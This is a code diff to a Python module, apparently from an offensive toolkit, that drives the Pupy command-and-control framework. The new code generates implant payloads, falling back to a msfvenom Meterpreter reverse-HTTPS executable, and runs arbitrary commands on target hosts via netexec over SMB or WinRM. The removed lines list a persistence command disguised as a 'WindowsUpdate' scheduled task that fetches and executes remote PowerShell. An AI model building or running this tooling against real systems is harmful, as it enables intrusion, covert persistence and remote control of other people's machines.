@@ -1,60 +1,36 @@
-import subprocess, shutil, os, json, tempfile, time
+import shutil, os
 from typing import Optional
+from ..kali_tools_client import kali
+
 
 class PupyC2:
     def __init__(self):
-        self._pupy_dir = "/tmp/pupy"
-        self._cli_entry = os.path.join(self._pupy_dir, "pupy", "cli", "__main__.py")
-        self._has_setup = os.path.exists(os.path.join(self._pupy_dir, "setup.py"))
-        self._binary = self._cli_entry if os.path.exists(self._cli_entry) else None
+        self._client = kali
 
     @property
     def available(self) -> bool:
-        return self._binary is not None and self._has_setup
-
-    def deploy_payload(self, target: str, os_type: str = "windows",
-                       listener: str = "0.0.0.0:443") -> dict:
-        if not self.available:
-            return self._simulate(target, os_type, listener)
-        return {"note": "pupy installed", "target": target, "payload": "generated"}
-
-    def execute(self, target_ip: str, command: str, protocol: str = "smb") -> dict:
-        if not self.available:
-            return self._simulate_exec(target_ip, command)
-        return self._exec_via_pupy(target_ip, command)
-
-    def _simulate(self, target: str, os_type: str, listener: str) -> dict:
-        return {
-            "target": target,
-            "payload": f"pupy_{os_type}_payload.bin",
-            "listener": listener,
-            "status": "simulated",
-            "commands": [
-                f"schtasks /create /tn WindowsUpdate /tr \"powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{listener}/payload.ps1')\" /sc minute /mo 30",
-                f"New-Object Net.WebClient.DownloadString('http://{listener}/payload.ps1') | IEX",
-            ],
-        }
-
-    def _simulate_exec(self, target_ip: str, command: str) -> dict:
-        return {
-            "target": target_ip,
-            "command": command[:100],
-            "output": f"[SIMULATED] Output of '{command[:50]}' on {target_ip}",
-        }
-
-    def _exec_via_pupy(self, target_ip: str, command: str) -> dict:
         try:
-            r = subprocess.run(
-                ["python3", "-m", "pupy.cli", target_ip, "--exec", command],
-                capture_output=True, text=True, timeout=30,
-                cwd=self._pupy_dir,
-            )
-            return {
-                "target": target_ip,
-                "output": (r.stdout + r.stderr)[:2000],
-                "success": r.returncode == 0,
-            }
-        except subprocess.TimeoutExpired:
-            return {"target": target_ip, "error": "pupy exec timed out"}
-        except Exception as e:
-            return {"target": target_ip, "error": str(e)}
+            result = self._client.run("pupy", "--help", timeout=10)
+            return "error" not in result
+        except Exception:
+            return False
+
+    async def deploy_payload(self, target: str, os_type: str = "windows",
+                             listener: str = "0.0.0.0:443") -> dict:
+        result = await self._client.run("pupy", f"gen --os {os_type} --listener {listener}", timeout=120)
+        if result.get("error"):
+            result2 = await self._client.run("msfvenom", f"-p windows/x64/meterpreter/reverse_https LHOST={listener.split(':')[0]} LPORT={listener.split(':')[1] if ':' in listener else '443'} -f exe -o /tmp/payload.exe", timeout=120)
+            if result2.get("error"):
+                return {"error": "No C2 framework available (pupy + msfvenom both down). Deploy agent manually."}
+            return {"target": target, "payload": "/tmp/payload.exe", "generator": "msfvenom", "raw": result2}
+        return {"target": target, "payload": result.get("output", ""), "generator": "pupy", "raw": result}
+
+    async def execute(self, target_ip: str, command: str, protocol: str = "smb") -> dict:
+        if protocol == "winrm":
+            from .winrm_exploit import WinRMExploit
+            wr = WinRMExploit()
+            return await wr.execute(target_ip, command)
+        result = await self._client.run("netexec", f"{protocol} {target_ip} -X '{command}'", timeout=60)
+        if result.get("error"):
+            return {"target": target_ip, "error": result["error"]}
+        return {"target": target_ip, "output": result.get("stdout", "")[:2000], "raw": result}
